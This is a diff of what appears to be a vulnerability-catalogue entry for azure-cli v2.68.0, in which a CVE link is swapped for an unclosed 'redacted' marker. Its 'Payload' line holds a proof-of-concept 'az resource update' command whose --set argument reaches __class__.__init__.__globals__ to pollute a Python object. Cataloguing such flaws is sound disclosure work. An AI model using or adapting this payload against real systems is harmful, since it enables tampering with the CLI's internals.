@@ -5,7 +5,7 @@
 + Library: azure-cli
 + Stars: 4.1K
 + Version: v2.68.0
-+ CVE: [CVE-2025-24049](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-24049)
++ CVE: [redacted
 + Status: Pending
 + Payload: ```az resource update --ids /subscriptions/2f5657fb-2e1b-4b1b-afd1-635a17df91c5/resourceGroups/Nothing_group/providers/Microsoft.Web/staticSites/Nothing --set __class__.__init__.__globals__.__name__=polluted```
 + Foundby: BlackPyrl
